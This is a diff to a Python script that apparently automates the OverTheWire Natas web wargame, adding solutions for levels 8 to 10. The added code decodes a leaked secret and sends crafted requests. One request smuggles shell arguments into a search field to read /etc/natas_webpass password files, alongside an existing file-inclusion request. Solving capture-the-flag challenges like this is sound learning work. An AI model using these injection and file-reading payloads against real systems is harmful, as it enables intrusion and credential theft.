@@ -54,7 +54,7 @@ while True:
     elif cmd == "passwords":
         print("Level passwords:")
         for k, v in enumerate(passwords):
-            print(" Level {}: {}".format(k, v))
+            print(" {}{} {}".format(login, k, v))
     elif cmd == "level":
         print("Current level {}".format(level))
     elif cmd.startswith("level ") or cmd == "next" or cmd == "n":
@@ -149,6 +149,8 @@ while True:
                     print(" Password found: {}".format(passwords[level + 1]))
                 else:
                     print(" Password not found")
+            else:
+                print(" Secret not found")
         elif level == 7:
             u = "/index.php?page=/etc/natas_webpass/natas8"
             print(" Get page {}".format(u))
@@ -163,7 +165,49 @@ while True:
                 print(" Password found: {}".format(passwords[level + 1]))
             else:
                 print(" Password not found")
+        elif level == 8:
+            f = "/index-source.html"
+            print(" Search secret in {}".format(f))
+            res, reg = rex(
+                "GET",
+                f,
+                "\$encodedSecret&nbsp;=&nbsp;\"(\w+)\";",
+            )
+            
+            if reg:
+                s = reg[1]
+                print(" Decoding secret {}".format(s))
+                s = base64.b64decode(bytes.fromhex(s).decode()[::-1]).decode()
+                print(" Post form with secret {}".format(s))
+                res, reg = rex(
+                    "POST",
+                    "/",
+                    "The password for natas9 is (\w+)\n",
+                    headers={"Content-type": "application/x-www-form-urlencoded"},
+                    body="secret={}&submit=submit".format(s),
+                )
 
+                if reg:
+                    if len(passwords) == level + 1: passwords.append(reg[1])
+                    print(" Password found: {}".format(passwords[level + 1]))
+                else:
+                    print(" Password not found")
+            else:
+                print(" Secret not found")
+        elif level == 9 or level == 10:
+            u = "/?needle=\"\"+%2Fetc%2Fnatas_webpass%2Fnatas{}+%23&submit=Search".format(level + 1)
+            print(" Get page {}".format(u))
+            res, reg = rex(
+                "GET",
+                u,
+                "<pre>\n(\w+)\n</pre>",
+            )
+
+            if reg:
+                if len(passwords) == level + 1: passwords.append(reg[1])
+                print(" Password found: {}".format(passwords[level + 1]))
+            else:
+                print(" Password not found")
         else:
             print("Level must be between 1-34")
     else:
